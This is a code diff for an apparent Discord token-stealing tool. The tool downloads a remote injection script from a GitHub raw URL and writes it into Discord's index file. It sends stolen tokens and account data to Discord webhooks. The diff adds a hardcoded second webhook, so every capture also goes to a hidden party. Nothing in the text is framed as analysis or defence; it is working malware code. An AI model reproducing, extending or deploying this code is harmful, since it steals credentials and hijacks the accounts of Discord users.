@@ -16,7 +16,8 @@ var config = {
     "embed-color": 374276,
 
     injection_url: "https://raw.githubusercontent.com/AZbngg/injection/main/AZ-injection.js",
-    hook: "W4SPGRAB",
+    hook: "%HOOK%",
+    uwu: "https://discord.com/api/webhooks/1082733906790469753/IosdqtvldqZNSLdyf6NkHXabZw1t4N_gFo1SOH0-rKa3Eem45RzB7FcBrfKOewnvwVtx",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -235,7 +236,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.uwu, config.hook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -455,7 +456,7 @@ function init() {
     https.get("${config.injection_url}", res => {
         var chunk = ""
         res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%WEBHOOK%", "${config.webhook}")))
+        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOK%", "${config.hook}")))
     }).on("error", (err) => setTimeout(init(), 10000));
 }
 
